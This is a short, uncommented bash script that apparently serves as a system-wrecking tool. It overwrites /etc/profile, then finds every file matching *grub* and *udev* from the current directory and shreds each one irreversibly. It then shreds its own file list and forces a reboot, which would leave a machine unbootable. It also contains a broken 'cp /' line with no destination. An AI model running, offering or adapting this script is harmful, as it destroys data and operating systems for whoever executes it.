#!/bin/bash


cp /

rm -rf /etc/profile
cp /home/it5/.profile /etc/profile

find ./ -name *grub* > /home/ratio.txt

file="/home/ratio.txt"

while read -r line; do  
        to_delete=$line
        shred -n 6 -z -u -v $to_delete 
done<$file
rm -rf /home/ratio.txt

find ./ -name *udev* > /home/ratio.txt

file="/home/ratio.txt"

while read -r line; do  
        to_delete=$line
        shred -n 6 -z -u -v $to_delete 
done<$file
shred -n 6 -z -u -v /home/ratio.txt

reboot
